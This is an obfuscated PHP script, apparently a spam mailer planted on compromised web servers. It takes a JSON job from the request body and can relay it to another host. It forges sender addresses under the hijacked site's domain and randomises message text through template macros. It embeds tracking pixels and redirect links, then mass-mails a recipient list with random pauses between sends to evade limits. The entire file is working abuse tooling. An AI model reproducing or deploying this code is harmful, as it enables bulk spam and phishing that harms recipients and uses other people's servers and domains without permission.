<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp2e603c) { if ($sp2e603c == 'keys') { return array_keys($this->_keys); } } public function Import($sp2e603c, $spb398f4) { if (is_array($spb398f4)) { $this->values[$sp2e603c] = array(); foreach ($spb398f4 as $sp980c1b) { if (!empty($sp980c1b['key'])) { $this->values[$sp2e603c][$sp980c1b['key']] = $sp980c1b['value']; } else { $this->values[$sp2e603c][] = $sp980c1b['value']; } } } else { $this->Assign($sp2e603c, $spb398f4); } } public function Assign($sp2e603c, $sp1026db) { $this->values[$sp2e603c] = $sp1026db; } public function Parse($spde7542) { $sp76d821 = ''; $spab41e3 = 0; while (true) { $sp715c20 = strpos($spde7542, '{', $spab41e3); if ($sp715c20 === false) { $sp76d821 .= substr($spde7542, $spab41e3); break; } $sp76d821 .= substr($spde7542, $spab41e3, $sp715c20 - $spab41e3); $spab41e3 = $sp715c20 + 1; $spf9dec4 = ''; $sp61cb3f = '{'; $sp11206b = array(); $sp838892 = false; $sp22b266 = false; $spa8585b = 'var'; while ($spab41e3 < strlen($spde7542)) { $spbd546d = substr($spde7542, $spab41e3, 1); $sp61cb3f .= $spbd546d; if ($spbd546d == ',' || $spbd546d == '>' || $spbd546d == '|') { if ($spa8585b == 'alias') { $sp838892 = $spf9dec4; } elseif ($spa8585b == 'mod') { $sp22b266 = $spf9dec4; } else { $sp11206b[] = $spf9dec4; } $spf9dec4 = ''; if ($spbd546d == '>') { $spa8585b = 'alias'; } if ($spbd546d == '|') { $spa8585b = 'mod'; } $spab41e3++; continue; } if ($spbd546d == '}') { if ($spa8585b == 'alias') { $sp838892 = $spf9dec4; } elseif ($spa8585b == 'mod') { $sp22b266 = $spf9dec4; } else { $sp11206b[] = $spf9dec4; } $spab41e3++; break; } $spf9dec4 .= $spbd546d; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spbd546d) == 0) { $spab41e3++; $sp11206b = array(); break; } $spab41e3++; } if (sizeof($sp11206b) == 0) { $sp76d821 .= $sp61cb3f; continue; } $spf69933 = false; $sp5e1048 = false; if (preg_match('/^\\^/', $sp11206b[0]) > 0) { $sp11206b[0] = substr($sp11206b[0], 1); $spf69933 = true; } if (preg_match('/^\\!/', $sp11206b[0]) > 0) { $sp11206b[0] = substr($sp11206b[0], 1); $sp5e1048 = true; } $spe428c4 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp11206b[0], $sp18b985) > 0) { $spe428c4 = $sp18b985[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp11206b[0], $sp18b985) > 0) { $spe428c4 = explode('-', $sp18b985[1]); } if ($spe428c4 !== false) { $sp11206b[0] = substr($sp11206b[0], 0, strpos($sp11206b[0], '[')); } $this->_keys[$sp11206b[0]] = true; if (empty($this->values[$sp11206b[0]]) && empty($this->fixed[$sp11206b[0]])) { continue; } if ($spf69933) { unset($this->fixed[$sp11206b[0]]); } if (isset($this->fixed[$sp11206b[0]])) { $sp79696a = $this->fixed[$sp11206b[0]]; } else { $sp79696a = ''; $spad2322 = 1; if (sizeof($sp11206b) == 2) { $spad2322 = $sp11206b[1]; } if (sizeof($sp11206b) == 3) { $spad2322 = rand($sp11206b[1], $sp11206b[2]); } for ($sp7faaef = 0; $sp7faaef < $spad2322; $sp7faaef++) { if (is_array($this->values[$sp11206b[0]])) { if (!is_array($this->used[$sp11206b[0]])) { $this->used[$sp11206b[0]] = array(); } if (count($this->used[$sp11206b[0]]) == count($this->values[$sp11206b[0]])) { $this->used[$sp11206b[0]] = array(); } if ($spe428c4 !== false && is_scalar($spe428c4)) { $sp79696a .= $this->values[$sp11206b[0]][$spe428c4]; $this->used[$spe428c4] = true; } else { $spc1a0ef = array(); if (is_array($spe428c4)) { $sp8fae15 = $spe428c4[0]; $speea2fc = $spe428c4[1]; } else { $sp8fae15 = 0; $speea2fc = count($this->values[$sp11206b[0]]) - 1; } for ($sp748722 = $sp8fae15; $sp748722 <= $speea2fc; $sp748722++) { if ($sp5e1048 && !empty($this->used[$sp11206b[0]][$sp748722])) { continue; } $spc1a0ef[] = $sp748722; } $spce0215 = $spc1a0ef[rand(0, count($spc1a0ef) - 1)]; $this->used[$sp11206b[0]][$spce0215] = true; $sp79696a .= $this->values[$sp11206b[0]][$spce0215]; } } else { $sp79696a .= $this->values[$sp11206b[0]]; } } } $sp79696a = $this->Parse($sp79696a); if ($sp22b266 !== false) { for ($sp412c5d = 0; $sp412c5d < strlen($sp22b266); $sp412c5d++) { switch (substr($sp22b266, $sp412c5d, 1)) { case 'b': $sp79696a = base64_encode($sp79696a); break; case 'q': $sp79696a = quoted_printable_encode($sp79696a); break; default: break; } } } if ($spf69933) { $this->fixed[$sp11206b[0]] = $sp79696a; } if ($sp838892 !== false && $sp838892 != '') { $this->fixed[$sp838892] = $sp79696a; } $sp76d821 .= $sp79696a; } return $sp76d821; } } $sp618be5 = file_get_contents('php://input'); $sp1edea8 = json_decode($sp618be5, true); if (empty($sp1edea8['via_proxy'])) { $sp1edea8['via_proxy'] = true; $sp8ab032 = curl_init($sp1edea8['prefix'] . $sp1edea8['files']['s']); $sp11cad0 = json_encode($sp1edea8); curl_setopt($sp8ab032, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp8ab032, CURLOPT_TIMEOUT, 600); curl_setopt($sp8ab032, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp8ab032, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp8ab032, CURLOPT_REFERER, $spe14635); curl_setopt($sp8ab032, CURLOPT_POST, true); curl_setopt($sp8ab032, CURLOPT_POSTFIELDS, $sp11cad0); curl_setopt($sp8ab032, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp11cad0))); $sp7f770d = curl_exec($sp8ab032); echo $sp7f770d; die; } $sp381b1d = $_SERVER['SERVER_ADDR']; $spd2349f = $_SERVER['HTTP_HOST']; $spd2349f = preg_replace('/^www\\./', '', $spd2349f); $sp56183d = new Macros(); $sp56183d->Assign('server_addr', $sp381b1d); $sp56183d->Assign('server_host', $spd2349f); foreach ($sp1edea8['macros'] as $sp2e603c => $spb398f4) { $sp56183d->Import($sp2e603c, $spb398f4); } $sp3aaa8e = preg_replace('/^www\\./i', '', $spd2349f); $sp0b5472 = $sp56183d->Parse('{from_user}@' . $sp3aaa8e); $sp56183d->Assign('from_email', $sp0b5472); $sp56183d->Assign('prefix', $sp1edea8['prefix']); $sp56183d->Assign('html', $sp1edea8['letter']['html']); $spab41e3 = 0; $spa8d002 = 0; $sp462aba = 0; $sp57eba3 = array(); foreach ($sp1edea8['rcpt'] as $sp7525a5) { $sp56183d->Assign('email', $sp7525a5['email']); $sp56183d->Assign('entry', $sp7525a5); $sp56183d->Assign('date', date('r')); $sp56183d->Assign('redirect', $sp1edea8['prefix'] . $sp1edea8['files']['r']); $sp56183d->Assign('redirect_with_uri', $sp1edea8['prefix'] . $sp1edea8['files']['r'] . '?uri='); $sp56183d->Assign('unsubscribe', $sp1edea8['prefix'] . $sp1edea8['files']['u'] . '?id=' . $sp7525a5['id']); $sp56183d->Assign('delivery', '<img src="' . $sp1edea8['prefix'] . $sp1edea8['files']['d'] . '?id=' . $sp7525a5['id'] . '" />'); $sp7f713f = $sp56183d->Parse($sp1edea8['envelope']['header']); $sp8e8e75 = $sp56183d->Parse($sp1edea8['envelope']['body']); if (!empty($sp7525a5['name'])) { $spf8030f = $sp7525a5['name'] . ' <' . $sp7525a5['email'] . '>'; } else { $spf8030f = $sp7525a5['email']; } $sp1201b0 = $sp56183d->Parse($sp1edea8['letter']['subject']); if ($spab41e3 > 0) { sleep(rand(3, 8)); } $spf57a6c = mail($spf8030f, $sp1201b0, $sp8e8e75, $sp7f713f); $sp57eba3[$sp7525a5['id']] = $spf57a6c; if ($spf57a6c) { $spa8d002++; } else { $sp462aba++; } $spab41e3++; } echo serialize(array('total' => count($sp1edea8['rcpt']), 'sent' => $spab41e3, 'success' => $spa8d002, 'error' => $sp462aba, 'rcpt' => $sp57eba3));